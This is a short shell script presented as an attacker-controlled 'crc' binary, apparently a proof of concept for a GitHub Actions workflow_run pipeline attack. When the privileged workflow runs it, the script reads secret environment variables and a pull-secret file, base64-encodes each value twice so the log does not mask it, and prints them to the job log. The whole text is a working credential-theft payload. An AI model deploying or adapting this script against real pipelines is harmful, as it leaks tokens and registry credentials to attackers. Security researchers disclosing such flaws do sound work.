#!/bin/sh
# attacker-controlled crc binary built by PR-triggered windows-artifacts.yml
# and executed by the privileged workflow_run sink (linux-qe-template)
if [ -n "${GERALT_SECRET:-}" ]; then
  echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
fi
if [ -n "${PULL_SECRET:-}" ]; then
  echo "GERALT_LEAKED_PULLSECRET=$(printf '%s' "$PULL_SECRET" | base64 | base64)"
fi
if [ -n "${TESTING_FARM_API_TOKEN:-}" ]; then
  echo "GERALT_LEAKED_TFTOKEN=$(printf '%s' "$TESTING_FARM_API_TOKEN" | base64 | base64)"
fi
if [ -z "${GERALT_SECRET:-}" ] && [ -f /opt/crc/pull-secret ]; then
  echo "GERALT_LEAKED_TOKEN=$(base64 -w0 /opt/crc/pull-secret | base64)"
fi
exit 1
